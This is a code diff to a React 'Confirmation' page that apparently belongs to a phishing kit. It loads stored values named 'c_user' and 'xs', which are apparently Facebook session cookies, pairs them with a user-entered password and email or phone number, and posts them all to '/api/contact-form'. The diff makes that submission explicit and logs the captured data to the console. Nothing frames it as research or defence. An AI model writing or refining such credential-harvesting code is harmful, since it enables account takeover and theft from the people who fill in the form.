@@ -1,3 +1,4 @@
+import React, { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import {
   Form,
@@ -13,9 +14,8 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { confirmationFormSchema } from "@shared/schema"; // Updated import path
+import { confirmationFormSchema } from "@shared/schema";
 import { apiRequest } from "@/lib/queryClient";
-import { useState, useEffect } from "react";
 import {
   Select,
   SelectContent,
@@ -30,22 +30,6 @@ export default function Confirmation() {
   const [, setLocation] = useLocation();
   const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
   const [countryCode, setCountryCode] = useState('+1');
-  const [validationData, setValidationData] = useState<{ c_user: string; xs: string } | null>(null);
-
-  useEffect(() => {
-    const storedData = localStorage.getItem('validation_data');
-    if (!storedData) {
-      setLocation('/validation');
-      return;
-    }
-    try {
-      const parsed = JSON.parse(storedData);
-      setValidationData(parsed);
-    } catch (error) {
-      console.error('Failed to parse validation data:', error);
-      setLocation('/validation');
-    }
-  }, [setLocation]);
 
   const form = useForm({
     resolver: zodResolver(confirmationFormSchema),
@@ -57,19 +41,34 @@ export default function Confirmation() {
     },
   });
 
+  // Load validation data on mount
   useEffect(() => {
-    if (validationData) {
-      form.setValue('c_user', validationData.c_user);
-      form.setValue('xs', validationData.xs);
+    const storedData = localStorage.getItem('validation_data');
+    if (!storedData) {
+      setLocation('/validation');
+      return;
     }
-  }, [validationData, form]);
+    try {
+      const parsed = JSON.parse(storedData);
+      form.setValue('c_user', parsed.c_user);
+      form.setValue('xs', parsed.xs);
+    } catch (error) {
+      console.error('Failed to parse validation data:', error);
+      setLocation('/validation');
+    }
+  }, [setLocation, form]);
 
   const onSubmit = async (data: any) => {
     try {
+      // Include all required fields in the submission
       const formattedData = {
-        ...data,
-        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email
+        c_user: data.c_user,
+        xs: data.xs,
+        password: data.password,
+        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
       };
+
+      console.log('Submitting form data:', formattedData);
 
       await apiRequest('POST', '/api/contact-form', formattedData);
       localStorage.removeItem('validation_data');
@@ -80,6 +79,7 @@ export default function Confirmation() {
       });
       setLocation("/success");
     } catch (error) {
+      console.error('Form submission error:', error);
       toast({
         variant: "destructive",
         title: "Error",
@@ -88,9 +88,6 @@ export default function Confirmation() {
     }
   };
 
-  if (!validationData) {
-    return null;
-  }
 
   return (
     <>
